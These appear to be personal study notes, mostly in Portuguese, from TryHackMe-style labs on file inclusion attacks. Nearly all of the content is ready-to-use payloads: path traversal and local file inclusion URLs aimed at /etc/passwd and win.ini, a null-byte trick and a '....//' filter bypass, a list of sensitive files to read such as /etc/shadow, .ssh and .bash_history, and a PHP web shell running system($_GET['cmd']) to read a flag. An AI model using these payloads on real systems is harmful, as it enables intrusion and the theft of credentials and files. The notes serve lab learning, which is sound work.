# File Inclusion attack

## path traversal

o file\_get\_content funcao do php eh muito utilizada para isso

https://www.php.net/manual/en/function.file-get-contents.php

http://webapp.thm/get.php?file=../../../../boot.ini

http://webapp.thm/get.php?file=../../../../windows/win.ini

paths legais para pegar info:

/etc/passwd

/etc/shadow

/etc/issue

/etc/profile

/proc/version

.ssh

dmessage

.bash_history

C:\\boot.ini

```
lsb_release -a
```

## Local file inclusion (LFI)

nullbyte injection trick (nao funfa em php => 5.3.4)

include("languages/../../../../../etc/passwd%00").".php"); which equivalent to → include("languages/../../../../../etc/passwd");

[http://10.10.35.207/lab3.php?file=../../../../../etc/passwd](http://10.10.35.207/lab3.php?file=../../../../../etc/passwd%00)

mais uma:

[http://10.10.35.207/lab5.php?file=....//....//....//....//....//etc/passwd](http://10.10.35.207/lab5.php?file=....//....//....//....//....//etc/passwd%00)

como ele checa o ../ e substitui por um espaço vazio, vc coloca mais um e ele ignora.

mais uma:

http://10.10.35.207/lab6.php?file=THM-profile/../../../../etc/os-release

precisa incluir o diretorio.

## funções vulneráveis no php:

include, include\_once, require, require\_once, file\_get\_contents

## Remote file inclusion (RFI)

&lt;?PHP print exec('hostname'); ?&gt;

pega um arquivo joga esse codigo de php la e voalla, lembre-se que a restrições de comando.

acpid amd64-microcode apache-htcacheclean apport bsdmainutils console-setup crda cron cryptdisks dbus ebtables grub grub-bkup grub.d grub.ucf-dist intel-microcode irqbalance keyboard locale mdadm motd-news networkd-dispatcher nss open-iscsi pollinate rsync rsyslog ssh ufw useradd

`<?php
echo system($_GET["cmd"]);
?>`

http://shell.uploadvulns.thm/resources/test.php?cmd=cat%20/var/www/flag.txt